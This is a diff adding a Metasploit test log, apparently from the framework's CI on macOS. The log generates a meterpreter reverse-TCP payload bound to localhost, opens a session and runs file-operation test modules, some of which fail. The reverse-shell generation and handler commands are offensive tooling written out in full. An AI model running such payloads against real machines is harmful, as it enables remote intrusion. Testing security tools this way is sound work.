@@ -1,0 +1,59 @@
+use osx/x64/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220129-4752-1mc7aox -f macho MeterpreterTryToFork=false lport=6045 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> [*] Writing 810224 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220129-4752-1mc7aox...
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 44
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6045 
+[*] Meterpreter session 45 opened (127.0.0.1:6045 -> 127.0.0.1:49727 ) at 2022-01-29 00:21:58 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=45 addentropy=true verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[!]  * missing Meterpreter features: stdapi_railgun_api
+[*] Running against session 45
+[*] Session type is meterpreter and platform is osx
+[*] Writing 31264 bytes
+[*] Finished in 0.057591
+[+] should write binary data
+[*] Read 31264 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[+] should append binary data
+[+] should expand home
+[+] should not expand non-isolated tilde
+[+] should not expand mid-string tilde
+[+] should not expand env vars with invalid naming
+[+] should expand multiple variables
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[+] should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[*] Creating directory test-dir/directory
+[*] test-dir/directory created
+[-] FAILED: should create directories
+[+] should list the directory we just made
+[-] FAILED: should recursively delete the directory we just made
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_delete_dir: Operation failed: 1
+[*] Creating directory test-dir
+[*] test-dir created
+[-] FAILED: should delete a symbolic link target
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_delete_dir: Operation failed: 1
+[*] Creating directory test-dir.1
+[*] test-dir.1 created
+[*] Creating directory test-dir.2
+[*] test-dir.2 created
+[-] FAILED: should not recurse into symbolic link directories
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_delete_dir: Operation failed: 1
+[*] Testing complete in 1.563415
+[-] Passed: 20; Failed: 1
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
